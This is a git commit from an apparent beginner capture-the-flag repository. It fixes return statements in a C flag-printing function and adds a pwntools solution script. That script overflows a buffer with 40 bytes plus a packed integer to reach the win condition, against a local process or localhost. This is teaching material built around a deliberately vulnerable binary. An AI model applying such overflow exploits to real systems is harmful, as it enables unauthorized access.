8294ba8b801af0a2f0a692e9e78ced6d510e2a64
Alan Davide Bovo <88632271+AlBovo@users.noreply.github.com>
2024-07-19 14:09:12 +0000

    fixed a few bugs and added writeup

--- Beginners/Pwn1/src/pwn1.c
+++ Beginners/Pwn1/src/pwn1.c
@@ -18,12 +18,12 @@ void win(){
 
     if (flag == NULL) {
         printf("Error: File not found\n");
-        return 1;
+        return;
     }
 
     if (fgets(data, 38, flag) == NULL){
         printf("Error: Flag file is empty\n");
-        return 1;
+        return;
     }
     fclose(flag);
     printf("Here's your prize: %s", &data);
---
+++ Beginners/Pwn1/writeup/sol.py
@@ -0,0 +1,14 @@
+#!/usr/bin/env python3
+from pwn import *
+
+# Change this to remote if you want to run it on remote server
+if args.REMOTE:
+    r = remote('localhost', 1337) # change host and port
+else:
+    r = process('./pwn1')
+
+PAYLOAD = b'A' * 40 + p32(1337)
+r.recvuntil(b'?\n')
+r.sendline(PAYLOAD + b'\x00')
+
+r.interactive()
